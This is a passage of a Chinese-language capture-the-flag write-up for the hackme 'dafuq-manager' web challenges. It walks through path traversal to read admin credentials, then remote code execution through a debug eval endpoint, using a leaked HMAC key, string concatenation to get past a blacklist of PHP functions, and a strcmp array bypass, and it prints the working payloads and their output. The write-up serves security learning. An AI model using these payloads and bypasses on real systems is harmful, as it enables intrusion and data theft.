/posts/ctf-hackme-web-write-up/32/6_hu3f98e7fefa237b8da29c793843434845_20228_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/32/6_hu3f98e7fefa237b8da29c793843434845_20228_660x0_resize_box_3.png alt style=width:100%></figure></p><p>看起來<code>dir</code>是受到過濾的，但<code>item</code>似乎&mldr;<br>不在<code>dir</code>指定路徑，而是改從<code>item</code>來繞過。</p><p>嘗試不傳送<code>dir</code>，只傳送<code>item</code>。</p><p>嘗試幾次之後，找到<code>item</code>輸入<code>/../.config/.htusers.php</code>可以繞過。<br><code>action=edit&amp;item=/../.config/.htusers.php</code>：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/32/7_huc5cdd76babd71253369022f4c106eb3e_63388_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/32/7_huc5cdd76babd71253369022f4c106eb3e_63388_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/32/7_huc5cdd76babd71253369022f4c106eb3e_63388_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/32/7_huc5cdd76babd71253369022f4c106eb3e_63388_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/32/7_huc5cdd76babd71253369022f4c106eb3e_63388_660x0_resize_box_3.png alt style=width:100%></figure></p><p>成功讀取檔案內容，管理者帳號為「<code>adm1n15trat0r</code>」，MD5 雜湊的密碼為「<code>34af0d074b17f44d1bb939765b02776f</code>」。</p><hr><p>雖然雜湊理論上是無法被反解的，但若是該雜湊原文有被刻意的紀錄過，那麼就可以得知原文。<br>直接將這段雜湊放上網搜尋「<code>MD5 Decode</code>」，就可以得到原文為「<code>how do you turn this on</code>」。</p><p>帳號「<code>adm1n15trat0r</code>」，密碼「<code>how do you turn this on</code>」，登入：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/32/8_huff1b547e3ac8f0c5e8f000c38f2f955f_69192_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/32/8_huff1b547e3ac8f0c5e8f000c38f2f955f_69192_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/32/8_huff1b547e3ac8f0c5e8f000c38f2f955f_69192_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/32/8_huff1b547e3ac8f0c5e8f000c38f2f955f_69192_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/32/8_huff1b547e3ac8f0c5e8f000c38f2f955f_69192_660x0_resize_box_3.png alt style=width:100%></figure></p><p>打開<code>.flag-2_（´・ω・｀）.txt</code>就可以得到 Flag <code>FLAG{how do you turn this on?}</code></p><hr><h2 class="relative group">33. <a href=https://dafuq-manager.hackme.quest/ target=_blank>dafuq-manager 3</a><div id=33-dafuq-manager-3httpsdafuq-managerhackmequest class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#33-dafuq-manager-3httpsdafuq-managerhackmequest aria-label=定位點>#</a></span></h2><blockquote><p>Get a shell to find flag 3</p></blockquote><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/33/1_huc7c70f54cc590939e02345d759c99dae_41046_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/33/1_huc7c70f54cc590939e02345d759c99dae_41046_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/33/1_huc7c70f54cc590939e02345d759c99dae_41046_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/33/1_huc7c70f54cc590939e02345d759c99dae_41046_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/33/1_huc7c70f54cc590939e02345d759c99dae_41046_660x0_resize_box_3.png alt style=width:100%></figure></p><p>繼續上一題，點開檔案<code>.where-is-flag-3-do-you-know-that.txt</code>，會看到以下訊息：</p><pre tabindex=0><code>For flag3, you need a shell to get that. see $WEBROOT/flag3!
</code></pre><p>這題應該就是要拿到 shell，然後去根目錄下讀取「<code>flag3</code>」這個檔案。</p><hr><p>繼續 view code 可以在<code>core/fun_debug.php</code>這個檔案中看到如下內容：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff6ac1>function</span> <span style=color:#57c7ff>make_command</span>(<span style=color:#ff5c57>$cmd</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    <span style=color:#ff5c57>$hmac</span> <span style=color:#ff6ac1>=</span> hash_hmac(<span style=color:#5af78e>&#39;sha256&#39;</span>, <span style=color:#ff5c57>$cmd</span>, <span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;secret_key&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    <span style=color:#ff6ac1>return</span> sprintf(<span style=color:#5af78e>&#39;%s.%s&#39;</span>, base64_encode(<span style=color:#ff5c57>$cmd</span>), <span style=color:#ff5c57>$hmac</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#ff6ac1>function</span> <span style=color:#57c7ff>do_debug</span>() {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    assert(strlen(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#39;secret_key&#39;</span>]) <span style=color:#ff6ac1>&gt;</span> <span style=color:#ff9f43>40</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    <span style=color:#ff5c57>$dir</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#39;__GET&#39;</span>][<span style=color:#5af78e>&#39;dir&#39;</span>];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>    <span style=color:#ff6ac1>if</span> (strcmp(<span style=color:#ff5c57>$dir</span>, <span style=color:#5af78e>&#34;magically&#34;</span>) <span style=color:#ff6ac1>||</span> strcmp(<span style=color:#ff5c57>$dir</span>, <span style=color:#5af78e>&#34;hacker&#34;</span>) <span style=color:#ff6ac1>||</span> strcmp(<span style=color:#ff5c57>$dir</span>, <span style=color:#5af78e>&#34;admin&#34;</span>)) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>        show_error(<span style=color:#5af78e>&#39;You are not hacky enough :(&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#ff6ac1>list</span>(<span style=color:#ff5c57>$cmd</span>, <span style=color:#ff5c57>$hmac</span>) <span style=color:#ff6ac1>=</span> explode(<span style=color:#5af78e>&#39;.&#39;</span>, <span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#39;__GET&#39;</span>][<span style=color:#5af78e>&#39;command&#39;</span>], <span style=color:#ff9f43>2</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    <span style=color:#ff5c57>$cmd</span> <span style=color:#ff6ac1>=</span> base64_decode(<span style=color:#ff5c57>$cmd</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#ff5c57>$bad_things</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff6ac1>array</span>(<span style=color:#5af78e>&#39;system&#39;</span>, <span style=color:#5af78e>&#39;exec&#39;</span>, <span style=color:#5af78e>&#39;popen&#39;</span>, <span style=color:#5af78e>&#39;pcntl_exec&#39;</span>, <span style=color:#5af78e>&#39;proc_open&#39;</span>, <span style=color:#5af78e>&#39;passthru&#39;</span>, <span style=color:#5af78e>&#39;`&#39;</span>, <span style=color:#5af78e>&#39;eval&#39;</span>, <span style=color:#5af78e>&#39;assert&#39;</span>, <span style=color:#5af78e>&#39;preg_replace&#39;</span>, <span style=color:#5af78e>&#39;create_function&#39;</span>, <span style=color:#5af78e>&#39;include&#39;</span>, <span style=color:#5af78e>&#39;require&#39;</span>, <span style=color:#5af78e>&#39;curl&#39;</span>,);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    <span style=color:#ff6ac1>foreach</span> (<span style=color:#ff5c57>$bad_things</span> <span style=color:#ff6ac1>as</span> <span style=color:#ff5c57>$bad</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>        <span style=color:#ff6ac1>if</span> (stristr(<span style=color:#ff5c57>$cmd</span>, <span style=color:#ff5c57>$bad</span>)) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>            <span style=color:#ff6ac1>die</span>(<span style=color:#5af78e>&#39;2bad&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>        }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    <span style=color:#ff6ac1>if</span> (hash_equals(hash_hmac(<span style=color:#5af78e>&#39;sha256&#39;</span>, <span style=color:#ff5c57>$cmd</span>, <span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;secret_key&#34;</span>]), <span style=color:#ff5c57>$hmac</span>)) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>        <span style=color:#ff6ac1>die</span>(<span style=color:#ff6ac1>eval</span>(<span style=color:#ff5c57>$cmd</span>));
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>    } <span style=color:#ff6ac1>else</span> {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>        show_error(<span style=color:#5af78e>&#39;What does the fox say?&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>}
</span></span></code></pre></div><ul><li><code>make_command()</code> 將輸入的指令經過 hmac 之後，連同指令本身的 base64 編碼一起輸出。</li><li><code>do_debug()</code> 會去抓取「<code>$GLOBALS['__GET']['command']</code>」之後，經過黑名單<code>$bad_things</code>過濾敏感指令，並且將其拆分成<code>hmac</code>及<code>base64</code>兩段，然後判斷是否配對。</li></ul><p>我們可以在<code>.config/conf.php</code>中找到密鑰：<code>$GLOBALS["secret_key"] = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3'</code></p><p>這麼一來，理論上我們只需要將要觸發的指令用該密鑰進行<code>hmac</code>運算後再塞給 server 就行了。</p><p>但有個問題，剛剛看到黑名單檔掉了許多像是<code>system</code>、<code>exec</code>、<code>eval</code>、<code>curl</code>等可以讓系統執行指令的 function，要怎麼繞過？</p><p>其實也不難，只要不要讓單字同時出現即可，可以利用 PHP 的特性。<br>把「<code>system</code>」拆成「<code>sys</code>」及「<code>tem</code>」：<code>$c1="sys";$c2="tem";($c1.$c2)()</code> = <code>system()</code></p><hr><p>寫個 PHP 來幫助我們包裝指令：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff5c57>$cmd</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;ls -al&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff6ac1>function</span> <span style=color:#57c7ff>make_command</span>(<span style=color:#ff5c57>$cmd</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#ff5c57>$secret_key</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#ff5c57>$cmd</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;$c1=&#34;sys&#34;;$c2=&#34;tem&#34;;($c1.$c2)(&#34;&#39;</span><span style=color:#ff6ac1>.</span><span style=color:#ff5c57>$cmd</span><span style=color:#ff6ac1>.</span><span style=color:#5af78e>&#39;&#34;);&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#ff5c57>$hmac</span> <span style=color:#ff6ac1>=</span> hash_hmac(<span style=color:#5af78e>&#39;sha256&#39;</span>, <span style=color:#ff5c57>$cmd</span>, <span style=color:#ff5c57>$secret_key</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    <span style=color:#ff6ac1>return</span> sprintf(<span style=color:#5af78e>&#39;%s.%s&#39;</span>, base64_encode(<span style=color:#ff5c57>$cmd</span>), <span style=color:#ff5c57>$hmac</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#ff6ac1>echo</span> <span style=color:#ff5c57>$cmd</span><span style=color:#ff6ac1>.</span><span style=color:#5af78e>&#39;&lt;br&gt;&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#ff6ac1>echo</span> make_command(<span style=color:#ff5c57>$cmd</span>);
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/33/2_hufc512d22fa91ab35ee49e9673ad06f0a_21343_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/33/2_hufc512d22fa91ab35ee49e9673ad06f0a_21343_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/33/2_hufc512d22fa91ab35ee49e9673ad06f0a_21343_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/33/2_hufc512d22fa91ab35ee49e9673ad06f0a_21343_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/33/2_hufc512d22fa91ab35ee49e9673ad06f0a_21343_660x0_resize_box_3.png alt style=width:100%></figure></p><p>「<code>JGMxPSJzeXMiOyRjMj0idGVtIjsoJGMxLiRjMikoImxzIC1hbCIpOw==.df0bfdb55e82b6491b44ef33590e78add28dd90a3f52b616a20363d10ecd9f32</code>」就是要餵給<code>do_debug()</code>的值了。</p><p>在<code>index.php</code>當中有一段這麼寫：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff6ac1>switch</span> (<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;action&#34;</span>]) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff6ac1>.</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#ff6ac1>.</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#ff6ac1>.</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#ff6ac1>case</span> <span style=color:#5af78e>&#34;debug&#34;</span><span style=color:#ff6ac1>:</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        <span style=color:#ff6ac1>require</span> <span style=color:#5af78e>&#34;./core/fun_debug.php&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        do_debug(<span style=color:#ff5c57>$GLOBALS</span>[<span style=color:#5af78e>&#34;dir&#34;</span>]);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    <span style=color:#ff6ac1>break</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#ff6ac1>.</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#ff6ac1>.</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#ff6ac1>.</span>
</span></span></code></pre></div><p>而剛剛有看到<code>dir</code>該參數必須繞過「<code>strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")</code>」判斷。<br>但似乎它並沒有被嚴格過濾，所以可以傳陣列格式的<code>dir</code>讓<code>strcmp()</code>錯誤，即可失效。</p><p>所以整個 payload 大概長這樣：</p><pre tabindex=0><code>action=debug&amp;dir[]&amp;command=JGMxPSJzeXMiOyRjMj0idGVtIjsoJGMxLiRjMikoImxzIC1hbCIpOw==.df0bfdb55e82b6491b44ef33590e78add28dd90a3f52b616a20363d10ecd9f32
</code></pre><p>執行之後就可以看到畫面顯示：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/33/3_hud02732534e036c8b8fa6d18325712e55_41613_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/33/3_hud02732534e036c8b8fa6d18325712e55_41613_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/33/3_hud02732534e036c8b8fa6d18325712e55_41613_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/33/3_hud02732534e036c8b8fa6d18325712e55_41613_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/33/3_hud02732534e036c8b8fa6d18325712e55_41613_660x0_resize_box_3.png alt style=width:100%></figure></p><p>Um&mldr; 有點亂，整理一下：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>total <span style=color:#ff9f43>44</span> 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>drwxr-xr-x <span style=color:#ff9f43>10</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>4096</span> Nov <span style=color:#ff9f43>16</span> <span style=color:#ff9f43>2017</span> . 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>drwxr-xr-x <span style=color:#ff9f43>4</span> root root <span style=color:#ff9f43>4096</span> Jan <span style=color:#ff9f43>8</span> 09:19 .. 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>drwxr-xr-x <span style=color:#ff9f43>2</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>4096</span> Nov <span style=color:#ff9f43>16</span> <span style=color:#ff9f43>2017</span> .config 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>drwxr-xr-x <span style=color:#ff9f43>2</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>4096</span> Oct <span style=color:#ff9f43>4</span> <span style=color:#ff9f43>2016</span> core 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>drwxr-xr-x <span style=color:#ff9f43>4</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>4096</span> Oct <span style=color:#ff9f43>4</span> <span style=color:#ff9f43>2016</span> data 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>drwxr-xr-x <span style=color:#ff9f43>2</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>4096</span> Oct <span style=color:#ff9f43>4</span> <span style=color:#ff9f43>2016</span> flag3 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>drwxr-xr-x <span style=color:#ff9f43>2</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>4096</span> Oct <span style=color:#ff9f43>4</span> <span style=color:#ff9f43>2016</span> img 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>-rw-r--r-- <span style=color:#ff9f43>1</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>2233</span> Oct <span style=color:#ff9f43>4</span> <span style=color:#ff9f43>2016</span> index.php 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>drwxr-xr-x <span style=color:#ff9f43>2</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>4096</span> Oct <span style=color:#ff9f43>4</span> <span style=color:#ff9f43>2016</span> lang 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>drwxr-xr-x <span style=color:#ff9f43>2</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>4096</span> Oct <span style=color:#ff9f43>4</span> <span style=color:#ff9f43>2016</span> lib 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>drwxr-xr-x <span style=color:#ff9f43>2</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>1000</span> <span style=color:#ff9f43>4096</span> Oct <span style=color:#ff9f43>4</span> <span style=color:#ff9f43>2016</span> style 
</span></span></code></pre></div><p>原來<code>flag3</code>是個目錄，那麼先看看裡面有什麼東西。</p><p>用一樣的方式執行<code>ls -al flag3</code>：</p><pre tabindex=0><code>JGMxPSJzeXMiOyRjMj0idGVtIjsoJGMxLiRjMikoImxzIC1hbCBmbGFnMyIpOw==.86155156aee864578f4c7aec84c9a6e11c417b7aa350b845340bf6ec08238cb9
</code></pre><p>輸出：</p><pre tabindex=0><code>total 32 
drwxr-xr-x 2 1000 1000 4096 Oct 4 2016 . 
drwxr-xr-x 10 1000 1000 4096 Nov 16 2017 .. 
-rw-r--r-- 1 1000 1000 161 Oct 4 2016 Makefile 
-r-------- 1 1000 1000 72 Oct 4 2016 flag3 
-rwx--x--x 1 1000 1000 9232 Oct 4 2016 meow 
-rw-r--r-- 1 1000 1000 783 Oct 4 2016 meow.c 
</code></pre><p>Makefile 裡面長這樣：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-makefile data-lang=makefile><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#57c7ff>all</span><span style=color:#ff6ac1>:</span> 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    gcc meow.c -o meow 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>    sudo chown flag3:flag3 meow 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>    sudo chmod <span style=color:#ff9f43>111</span> meow 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>    sudo chmod +s meow 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>    sudo chown flag3:flag3 flag3 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>    sudo chmod <span style=color:#ff9f43>400</span> flag3 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span>    ./meow flag3 
</span></span></code></pre></div><p><code>flag3</code>似乎因為權限問題，無法被直接讀取。<br>先看看<code>meow.c</code>是什麼，執行「<code>cat ./flag3/meow.c</code>」：</p><pre tabindex=0><code>JGMxPSJzeXMiOyRjMj0idGVtIjsoJGMxLiRjMikoImNhdCAuL2ZsYWczL21lb3cuYyIpOw==.76282a859b8e5aa80039b069441b1cc450c57b77e250410cad889b3afdc1c101
